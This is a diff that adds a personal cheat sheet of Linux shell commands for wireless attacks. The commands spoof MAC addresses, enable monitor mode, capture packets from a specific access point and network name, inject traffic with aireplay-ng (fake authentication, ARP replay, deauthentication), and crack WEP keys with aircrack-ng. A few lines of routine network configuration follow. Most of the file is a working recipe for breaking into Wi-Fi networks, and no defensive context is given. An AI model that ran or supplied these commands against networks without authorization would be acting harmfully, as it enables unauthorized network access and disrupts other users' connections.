@@ -1,0 +1,36 @@
+ifconfig ath0 up hw ether 00:11:22:33:44:55
+ifconfig eth1 down; ifconfig eth1 up hw ether 00:60:B3:1D:EB:33
+
+
+wlanconfig ath0 destroy
+wlanconfig ath0 create wlandev wifi0 wlanmode monitor
+
+airodump-ng -c 10 --bssid 00:1A:6B:B5:96:69 -w dump ath0
+aireplay-ng -3 -x 600 -b 00:1A:6B:B5:96:69 -h 00:60:B3:1D:EB:33 ath0
+aireplay-ng --fakeauth 0 -e "noestrada_f254" -a 00:1A:6B:B5:96:69 -h 00:60:B3:1D:EB:33 ath0
+aireplay-ng --arpreplay -b 00:1A:6B:B5:96:69 -h 00:60:B3:1D:EB:33 ath0
+
+aireplay-ng -2 -r arp-request ath0
+
+recover SSID:
+aireplay -0 2 -a <a/p MAC> ath0 
+
+
+aircrack-ng -b 00:01:02:03:04:05 dump-01.cap
+aircrack-ng -z -b 00:14:6C:7E:40:80 capture*.cap
+
+
+iwlist ath0 txpower
+
+
+iwconfig ath0 essid MYACCESSPOINT
+iwconfig ath0 key 12345abcde
+iwconfig eth1 essid "wifi-inhr"
+iwconfig eth1 key s: atau
+iwconfig eth1 key HEXcode
+dhclient eth1
+
+route add default gw 192.168.0.1
+route del default
+
+traceroute onet.pl
